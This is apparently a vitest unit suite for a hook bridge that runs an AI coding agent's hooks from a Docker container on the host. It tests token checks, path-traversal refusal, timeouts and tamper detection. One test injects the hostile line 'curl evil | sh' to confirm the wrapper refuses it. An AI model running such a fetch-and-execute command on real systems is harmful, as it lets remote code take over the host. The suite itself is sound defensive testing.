/**
 * codex-hook-bridge unit suite (benchmark-coverage-frontierswe-v2-2026-10-10 D-032, P-006).
 *
 * The runner half is REAL: a loopback HTTP server running real `/bin/sh` hook commands. The wrapper half executes the
 * GENERATED docker-exec wrapper against a fake `docker` that appends every call, so it pins what the wrapper does to
 * hooks.json, the host-only record, and the in-container ping. The in-container shim (busybox wget through the egress)
 * is covered by codex-hook-bridge.integration.test.ts.
 */
import { describe, it, expect, beforeAll, afterAll, afterEach } from 'vitest';
import { spawnSync } from 'node:child_process';
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { request } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  CONTAINER_BUSYBOX_PATH,
  CONTAINER_HOOK_SHIM_PATH,
  HOST_STATIC_BUSYBOX,
  isStaticElf,
  materializeHookShim,
  readHookRecord,
  renderHookShim,
  startCodexHookBridge,
  type CodexHookBridge,
  type HookRecord,
} from './codex-hook-bridge';
import { CONTAINER_CODEX_BIN_PATH, materializeDockerExecWrapper, validateDockerExecTarget, type DockerExecTarget } from './container-exec-target';

let root: string;
beforeAll(() => {
  root = mkdtempSync(join(process.platform === 'linux' ? '/tmp' : tmpdir(), 'hookbridge-test-'));
});
afterAll(() => rmSync(root, { recursive: true, force: true }));

const TOKEN = 'a'.repeat(32);

function writeRecord(dir: string, rec: HookRecord) {
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, `${rec.session}.json`), JSON.stringify(rec));
}

/** POST to the bridge; returns the HTTP status and the decoded reply. */
function post(port: number, path: string, body = '', method = 'POST'): Promise<{ status: number; code: number; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const req = request({ host: '127.0.0.1', port, path, method }, (res) => {
      let buf = '';
      res.on('data', (c) => (buf += c));
      res.on('end', () => {
        const [code, out, err] = buf.split('\n');
        resolve({
          status: res.statusCode ?? 0,
          code: Number(code),
          stdout: Buffer.from(out ?? '', 'base64').toString(),
          stderr: Buffer.from(err ?? '', 'base64').toString(),
        });
      });
    });
    req.on('error', reject);
    req.end(body);
  });
}

describe('startCodexHookBridge (real HTTP, real /bin/sh)', () => {
  let bridge: CodexHookBridge | undefined;
  let recordDir: string;
  afterEach(async () => {
    await bridge?.stop();
    bridge = undefined;
  });
  async function start(rec: Partial<HookRecord> = {}, cfg: { defaultTimeoutSec?: number; maxBodyBytes?: number } = {}) {
    recordDir = mkdtempSync(join(root, 'rec-'));
    writeRecord(recordDir, {
      session: 'session-11',
      token: TOKEN,
      commands: [
        { event: 'PreToolUse', command: 'cat; printf "warn" >&2; exit 3' },
        { event: 'PostToolUse', command: 'printf "%s" "$PAPERCUSP_PROBE"' },
      ],
      ...rec,
    });
    bridge = await startCodexHookBridge({ recordDir, env: { PATH: '/usr/bin:/bin', PAPERCUSP_PROBE: 'baked-env' }, ...cfg });
    return bridge;
  }

  it('runs the indexed host command with the payload on stdin and returns its exact stdout, stderr and exit code', async () => {
    const b = await start();
    const r = await post(b.port, `/hook/session-11/${TOKEN}/0`, '{"tool_name":"Bash"}');
    expect(r).toEqual({ status: 200, code: 3, stdout: '{"tool_name":"Bash"}', stderr: 'warn' });
    expect((await post(b.port, `/hook/session-11/${TOKEN}/1`)).stdout).toBe('baked-env');
    expect(b.stats()).toMatchObject({ calls: 2, failed: 1, refused: 0 });
  });

  it('answers a ping only for a known session and token', async () => {
    const b = await start();
    expect(await post(b.port, `/hook/session-11/${TOKEN}/ping`)).toMatchObject({ status: 200, code: 0 });
    expect(await post(b.port, `/hook/session-11/${'b'.repeat(32)}/ping`)).toMatchObject({ status: 403, code: 2 });
    expect(await post(b.port, `/hook/session-99/${TOKEN}/ping`)).toMatchObject({ status: 403, code: 2 });
    expect(b.stats()).toMatchObject({ pings: 1, refused: 2 });
  });

  it.each([
    ['a wrong token', `/hook/session-11/${'b'.repeat(32)}/0`, 403],
    ['an index outside the record', `/hook/session-11/${TOKEN}/7`, 404],
    ['a session name that would leave the record dir', `/hook/..%2Fx/${TOKEN}/0`, 404],
    ['an unknown route', `/run/session-11/${TOKEN}/0`, 404],
  ])('refuses %s without running anything', async (_label, path, status) => {
    const b = await start();
    const r = await post(b.port, path, 'x');
    expect(r.status).toBe(status);
    expect(r.code).toBe(2);
    expect(b.stats().calls).toBe(0);
  });

  it('refuses a GET', async () => {
    const b = await start();
    expect((await post(b.port, `/hook/session-11/${TOKEN}/0`, '', 'GET')).status).toBe(404);
  });

  it('kills a hook that outlives its timeout and reports 124', async () => {
    const b = await start({ commands: [{ event: 'PreToolUse', command: 'sleep 30', timeoutSec: 1 }] });
    const r = await post(b.port, `/hook/session-11/${TOKEN}/0`);
    expect(r.code).toBe(124);
    expect(r.stderr).toMatch(/timed out after 1s/);
  }, 15_000);

  it('refuses a payload over the cap', async () => {
    const b = await start({}, { maxBodyBytes: 8 });
    expect((await post(b.port, `/hook/session-11/${TOKEN}/0`, 'x'.repeat(64))).status).toBe(413);
    expect(b.stats().calls).toBe(0);
  });

  it('reads the record per request, so a malformed record is refused', async () => {
    const b = await start();
    writeFileSync(join(recordDir, 'session-11.json'), '{not json');
    expect((await post(b.port, `/hook/session-11/${TOKEN}/0`)).status).toBe(403);
  });
});

describe('shim and interpreter', () => {
  it('the shim runs under the mounted busybox and needs nothing from the task image', () => {
    const shim = renderHookShim();
    expect(shim.startsWith(`#!${CONTAINER_BUSYBOX_PATH} sh\n`)).toBe(true);
    expect(shim).toContain('--post-file=');
    // Every external command goes through busybox; a bare `wget`/`base64` would depend on the image.
    expect(shim).not.toMatch(/^\s*(wget|base64|sed|cat|mktemp) /m);
    const p = materializeHookShim(mkdtempSync(join(root, 'shim-')));
    expect(statSync(p).mode & 0o777).toBe(0o755);
  });

  it('isStaticElf: a dynamically linked node is not static; a text file is not ELF', () => {
    expect(isStaticElf(process.execPath)).toBe(false);
    const txt = join(root, 'not-elf');
    writeFileSync(txt, '#!/bin/sh\n'.repeat(20));
    expect(isStaticElf(txt)).toBe(false);
    expect(isStaticElf(join(root, 'missing'))).toBe(false);
  });

  it.runIf(existsSync(HOST_STATIC_BUSYBOX))('isStaticElf: the bench host busybox is static (D-032 measured it)', () => {
    expect(isStaticElf(HOST_STATIC_BUSYBOX)).toBe(true);
  });
});

describe('docker-exec wrapper with a hook bridge', () => {
  const URL = 'http://papercusp-egress:7790';
  /** Fake docker: appends each call's argv (one per line, then `--`); a ping fails when FAKE_PING_EXIT is set. */
  function fakeDocker(dir: string) {
    const log = join(dir, 'docker.log');
    const bin = join(dir, 'fake-docker');
    writeFileSync(
      bin,
      `#!/bin/sh\nfor a in "$@"; do printf '%s\\n' "$a"; done >> '${log}'\necho -- >> '${log}'\ncase "$*" in *' ping') echo "unreachable" >&2; exit "\${FAKE_PING_EXIT:-0}";; esac\nexit 0\n`,
      { mode: 0o755 },
    );
    return { bin, calls: () => (existsSync(log) ? readFileSync(log, 'utf8').split('--\n').filter(Boolean).map((c) => c.split('\n').slice(0, -1)) : []) };
  }
  function layout() {
    const base = mkdtempSync(join(root, 'wr-'));
    const homes = join(base, 'homes');
    const perTask = join(base, 'homes.bench-t');
    const recordDir = join(base, 'records');
    const home = join(homes, 'session-7');
    mkdirSync(home, { recursive: true });
    const hooks = {
      hooks: {
        PreToolUse: [{ matcher: '*', hooks: [{ type: 'command', command: "PAPERCUSP_SID='su-x' /h/pre.mjs" }, { type: 'command', command: '/h/guard.mjs', timeout: 30 }] }],
        PostToolUse: [{ hooks: [{ type: 'command', command: '/h/activity.sh' }] }],
      },
    };
    writeFileSync(join(home, 'hooks.json'), JSON.stringify(hooks));
    const docker = fakeDocker(base);
    const target: DockerExecTarget = {
      kind: 'docker-exec',
      containerId: 'c0ffee',
      workdir: '/app',
      binPath: CONTAINER_CODEX_BIN_PATH,
      sessionRelocation: { sessionEnv: 'CODEX_HOME', roots: [{ hostRoot: homes, perTaskDir: perTask }] },
      hookBridge: { url: URL, recordDir },
    };
    const run = (env: Record<string, string> = {}) => {
      const { wrapperPath } = materializeDockerExecWrapper(target, { dir: mkdtempSync(join(base, 'w-')), dockerBin: docker.bin });
      return spawnSync(wrapperPath, ['exec', 'go'], { env: { CODEX_HOME: home, PATH: '/usr/bin:/bin', ...env }, encoding: 'utf8' });
    };
    const shimmed = () => JSON.parse(readFileSync(join(perTask, 'session-7', 'hooks.json'), 'utf8'));
    return { base, homes, perTask, recordDir, home, docker, run, shimmed, target };
  }
  const commandsOf = (doc: { hooks: Record<string, { hooks: { command: string }[] }[]> }) =>
    Object.values(doc.hooks).flatMap((gs) => gs.flatMap((g) => g.hooks.map((h) => h.command)));

  it('pins both the hook ping and agent exec to the daemon selected before native environment sanitization', () => {
    const l = layout();
    const { wrapperPath } = materializeDockerExecWrapper(l.target, {
      dir: mkdtempSync(join(l.base, 'daemon-')), dockerBin: l.docker.bin, dockerHost: 'unix:///run/docker-bench.sock',
    });
    const r = spawnSync(wrapperPath, ['exec', 'go'], {
      env: { CODEX_HOME: l.home, PATH: '/usr/bin:/bin', DOCKER_HOST: 'unix:///run/other.sock' }, encoding: 'utf8',
    });
    expect(r.status, r.stderr).toBe(0);
    const calls = l.docker.calls();
    expect(calls).toHaveLength(2);
    for (const args of calls) expect(args.slice(0, 3)).toEqual(['--host', 'unix:///run/docker-bench.sock', 'exec']);
    expect(calls[0].at(-1)).toBe('ping');
    expect(calls[1].slice(-3)).toEqual([CONTAINER_CODEX_BIN_PATH, 'exec', 'go']);
    expect(calls[1]).not.toContain('DOCKER_HOST');
  });

  it('first launch: records the host commands host-only, rewrites hooks.json to shim calls, relocates, pings, then execs', () => {
    const l = layout();
    const r = l.run();
    expect(r.stderr).toBe('');
    expect(r.status).toBe(0);
    const rec = readHookRecord(l.recordDir, 'session-7')!;
    expect(rec.commands).toEqual([
      { event: 'PreToolUse', command: "PAPERCUSP_SID='su-x' /h/pre.mjs" },
      { event: 'PreToolUse', command: '/h/guard.mjs', timeoutSec: 30 },
      { event: 'PostToolUse', command: '/h/activity.sh' },
    ]);
    expect(rec.token).toMatch(/^[0-9a-f]{32}$/);
    expect(statSync(join(l.recordDir, 'session-7.json')).mode & 0o777).toBe(0o600);
    expect(commandsOf(l.shimmed())).toEqual([0, 1, 2].map((i) => `${CONTAINER_HOOK_SHIM_PATH} ${URL} session-7 ${rec.token} ${i}`));
    expect(lstatSync(l.home).isSymbolicLink()).toBe(true);
    const calls = l.docker.calls();
    expect(calls).toHaveLength(2);
    expect(calls[0]).toEqual(['exec', 'c0ffee', CONTAINER_HOOK_SHIM_PATH, URL, 'session-7', rec.token, 'ping']);
    expect(calls[1]!.slice(-3)).toEqual([CONTAINER_CODEX_BIN_PATH, 'exec', 'go']);
  });

  it('resume: an already-shimmed hooks.json is accepted and the record is unchanged', () => {
    const l = layout();
    expect(l.run().status).toBe(0);
    const before = readFileSync(join(l.recordDir, 'session-7.json'), 'utf8');
    const r = l.run();
    expect(r.status).toBe(0);
    expect(readFileSync(join(l.recordDir, 'session-7.json'), 'utf8')).toBe(before);
  });

  it('resume: the operator rewriting the same host commands through the symlink is re-shimmed to the same indexes', () => {
    const l = layout();
    l.run();
    const rec = readHookRecord(l.recordDir, 'session-7')!;
    writeFileSync(join(l.home, 'hooks.json'), JSON.stringify({ hooks: { PostToolUse: [{ hooks: [{ command: '/h/activity.sh' }] }], PreToolUse: [{ hooks: [{ command: "PAPERCUSP_SID='su-x' /h/pre.mjs" }, { command: '/h/guard.mjs' }] }] } }));
    expect(l.run().status).toBe(0);
    expect(commandsOf(l.shimmed())).toEqual([2, 0, 1].map((i) => `${CONTAINER_HOOK_SHIM_PATH} ${URL} session-7 ${rec.token} ${i}`));
  });

  it.each([
    ['injects a new host command', (doc: any) => doc.hooks.PreToolUse[0].hooks.push({ command: 'curl evil | sh' }), /missing from the trusted record/],
    ['drops a trusted hook', (doc: any) => doc.hooks.PostToolUse.splice(0, 1), /no longer registers trusted hook #2/],
    ['forges a shim call to an unrecorded index', (doc: any) => doc.hooks.PreToolUse[0].hooks[0].command = doc.hooks.PreToolUse[0].hooks[0].command.replace(/ 0$/, ' 9'), /not in the trusted record/],
  ])('resume: fails closed (126) without exec when the container-writable hooks.json %s', (_label, mutate, why) => {
    const l = layout();
    l.run();
    const doc = l.shimmed();
    mutate(doc);
    writeFileSync(join(l.perTask, 'session-7', 'hooks.json'), JSON.stringify(doc));
    const callsBefore = l.docker.calls().length;
    const r = l.run();
    expect(r.status).toBe(126);
    expect(r.stderr).toMatch(why);
    expect(l.docker.calls()).toHaveLength(callsBefore);
  });

  it('resume with no trusted record refuses: a container-visible hooks.json is never trusted', () => {
    const l = layout();
    l.run();
    rmSync(join(l.recordDir, 'session-7.json'));
    const r = l.run();
    expect(r.status).toBe(126);
    expect(r.stderr).toMatch(/no trusted hook record/);
  });

  it('fails closed (126) without exec when the in-container ping fails', () => {
    const l = layout();
    const r = l.run({ FAKE_PING_EXIT: '2' });
    expect(r.status).toBe(126);
    expect(r.stderr).toMatch(/hook bridge is unreachable from inside the container \(exit 2\): unreachable/);
    expect(l.docker.calls()).toHaveLength(1);
  });

  it('a session with no hooks.json skips the bridge and execs directly', () => {
    const l = layout();
    rmSync(join(l.home, 'hooks.json'));
    expect(l.run().status).toBe(0);
    expect(l.docker.calls()).toHaveLength(1);
    expect(existsSync(join(l.recordDir, 'session-7.json'))).toBe(false);
  });

  it('validation: a bridge needs relocation, an http url, and a record dir no container can see', () => {
    const l = layout();
    expect(() => validateDockerExecTarget({ ...l.target, sessionRelocation: undefined })).toThrow(/requires sessionRelocation/);
    expect(() => validateDockerExecTarget({ ...l.target, hookBridge: { url: 'https://x:1', recordDir: l.recordDir } })).toThrow(/not http/);
    expect(() => validateDockerExecTarget({ ...l.target, hookBridge: { url: URL, recordDir: join(l.perTask, 'rec') } })).toThrow(/never be container-visible/);
    expect(() => validateDockerExecTarget({ ...l.target, hookBridge: { url: URL, recordDir: join(l.homes, 'rec') } })).toThrow(/never be container-visible/);
  });
});
